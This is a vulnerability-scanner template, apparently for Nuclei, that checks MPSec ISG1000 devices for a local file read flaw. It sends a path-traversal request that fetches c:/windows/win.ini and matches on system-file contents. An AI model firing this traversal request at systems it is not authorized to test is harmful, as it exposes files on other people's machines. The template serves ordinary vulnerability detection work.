id: mpsec-lfi2
info:
  author: pikpikcu
  name: MPSec ISG1000 Local File Read
  reference: https://twitter.com/sec715/status/1402884871173795842
  severity: high
  tags: mpsec,lfi
requests:
- matchers:
  - condition: or
    part: body
    regex:
    - for 16-bit app support
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - text/plain
  matchers-condition: and
  raw:
  - 'GET /webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../c:/windows/win.ini
    HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

    Accept-Encoding: gzip, deflate

    Accept: */*

    '
